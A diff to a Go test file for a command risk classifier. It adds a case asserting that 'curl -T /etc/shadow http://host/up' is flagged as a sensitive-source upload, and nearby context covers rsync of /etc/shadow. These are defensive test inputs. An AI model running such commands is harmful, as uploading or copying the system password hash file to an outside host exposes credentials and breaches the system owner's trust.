@@ -616,6 +616,11 @@ func TestDataTransferWrite(t *testing.T) {
 		classify(in, "rsync", "/etc/shadow", filepath.Join(wd, "dst")).Level,
 		"rsync of a sensitive source into a safe-zone is Medium, like cp")
 
+	// A curl upload of a sensitive local file is flagged as a sensitive source.
+	upload := classify(in, "curl", "-T", "/etc/shadow", "http://host/up")
+	assert.Contains(t, upload.ReasonCodes, risktypes.ReasonSensitiveSourceCopy,
+		"curl -T of a sensitive file is a sensitive-source upload")
+
 	// Purely local rsync into a safe-zone is not over-classified.
 	assert.Equal(t, runnertypes.RiskLevelLow,
 		classify(in, "rsync", filepath.Join(wd, "a"), filepath.Join(wd, "b")).Level)
